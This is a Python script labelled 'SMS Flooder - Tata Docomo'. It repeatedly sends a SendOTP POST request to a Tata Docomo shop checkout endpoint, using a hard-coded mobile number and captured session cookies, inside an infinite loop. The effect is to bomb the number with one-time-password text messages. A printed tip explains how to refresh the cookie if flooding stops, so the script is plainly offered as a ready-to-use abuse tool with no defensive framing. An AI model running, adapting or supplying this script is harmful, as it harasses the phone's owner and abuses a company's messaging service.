import requests


def tata_flood():
    url = "https://shop.tatadocomo.com/checkout.aspx"

    payload = "ExecuteMethod=SendOTP&OTPMobile=9984186736"
    headers = {
        'accept': "*/*",
        'accept-encoding': "gzip, deflate, br",
        'accept-language': "en-US,en;q=0.8",
        'connection': "keep-alive",
        'content-length': "42",
        'content-type': "application/x-www-form-urlencoded",
        'cookie': "ASP.NET_SessionId=yetxu055rxubyr55oc21rf55; tvc_vid=41503810935386; vis_id=1; tvc_lmtdofr_start_time=1503810935391; tvc_floodlight_lmtdofr_done=; tvc_floodlight_lmtdofr=; tvc_user_shop_a_live=1370994776.1503810935; tat_nc1=2; __ar_v4=MKKQKDONEVDOPM4W2JG3Z2%3A20170826%3A1%7CFAQEG5I7MNAGJGH6YOP5YN%3A20170826%3A2%7CRSIRSC66CZG2PBIGVHWC2Y%3A20170826%3A2%7C34TY5YXNYJDVBENICLOXRE%3A20170826%3A1; CgtmDateTime=8%2F27%2F2017%2010%3A45%3A37%20AM; pincode=560100; CuserID=1456589; _gat_UA-68329367-2=1; _ga=GA1.3.1370994776.1503810935; _gid=GA1.3.195790939.1503810935",
        'host': "shop.tatadocomo.com",
        'origin': "https://shop.tatadocomo.com",
        'referer': "https://shop.tatadocomo.com/photons-c-3.aspx",
        'user-agent': "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.101 Safari/537.36",
        'x-requested-with': "XMLHttpRequest",
        'cache-control': "no-cache",
        'postman-token': "8494a6d8-4e38-5288-862a-2d7a73e5c79d"
    }

    response = requests.request("POST", url, data=payload, headers=headers)

    print(response.text)


print '''

____ _ _ __ ___ ________

             ____      
       _____/ __ \_  __
      / ___/ / / / |/_/
     / /  / /_/ />  <  
    /_/  /_____/_/|_|  


____ _ _ __ ___ ________


'''

print 'SMS Flooder - Tata Docomo'
print 'If flooding doesnt starts or Resp is not SUCCESS, just change the cookie via visiting shop.tatadocomo.com'
print '#Ougrocks'
while(1):
    tata_flood()